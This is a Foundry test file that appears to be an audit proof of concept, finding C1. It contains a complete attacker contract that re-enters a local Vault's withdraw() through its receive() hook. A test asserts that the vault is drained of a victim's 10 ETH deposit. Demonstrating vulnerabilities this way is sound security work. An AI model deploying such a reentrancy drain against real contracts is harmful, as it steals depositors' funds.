// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/PriceOracle.sol";

/// @dev Attacker contract — deposits 1 ETH then re-enters withdraw()
///      until the vault is empty.
contract AttackReentrancy {
    Vault public vault;
    uint256 public depth;

    constructor(Vault _vault) {
        vault = _vault;
    }

    /// Step 1: deposit so we have shares.
    function deposit() external payable {
        vault.deposit{value: msg.value}();
    }

    /// Step 2: kick off the first withdraw; re-entrancy does the rest.
    function attack() external {
        vault.withdraw();
    }

    /// @dev Vault sends ETH here before clearing shares — re-enter.
    receive() external payable {
        // Keep re-entering until the vault can't cover even one more payout.
        if (address(vault).balance >= 1) {
            depth++;
            vault.withdraw();
        }
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract PocC1Reentrancy is Test {
    PriceOracle oracle;
    Vault       vault;

    address victim  = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public {
        oracle = new PriceOracle();
        vault  = new Vault(address(oracle));

        // Give victim and attacker starting ETH.
        vm.deal(victim,   100 ether);
        vm.deal(attacker,   2 ether);
    }

    function test_reentrancyDrainsVault() public {
        // ----- Victim deposits 10 ETH (normal use) -----
        vm.prank(victim);
        vault.deposit{value: 10 ether}();

        uint256 vaultBefore = address(vault).balance;
        emit log_named_uint("vault ETH before attack (wei)", vaultBefore);

        // ----- Attacker deploys contract and deposits 1 ETH -----
        vm.startPrank(attacker);
        AttackReentrancy atk = new AttackReentrancy(vault);

        // Fund and deposit through the attack contract.
        atk.deposit{value: 1 ether}();

        uint256 attackerBefore = attacker.balance; // remaining ETH on EOA
        uint256 contractBefore = atk.balance();
        emit log_named_uint("attacker contract ETH before attack (wei)", contractBefore);

        // ----- Execute the reentrancy attack -----
        atk.attack();
        vm.stopPrank();

        uint256 vaultAfter   = address(vault).balance;
        uint256 contractAfter = atk.balance();
        uint256 profit        = contractAfter - 1 ether; // deposited 1 ETH

        emit log_named_uint("vault ETH after attack (wei)",             vaultAfter);
        emit log_named_uint("attacker contract ETH after attack (wei)", contractAfter);
        emit log_named_uint("attacker profit (wei)",                    profit);
        emit log_named_uint("reentrancy depth",                         atk.depth());

        // Assertions — vault drained, attacker extracted more than deposited.
        assertEq(vaultAfter, 0, "vault should be fully drained");
        assertGt(contractAfter, 1 ether, "attacker should have more than the deposited 1 ETH");
    }
}
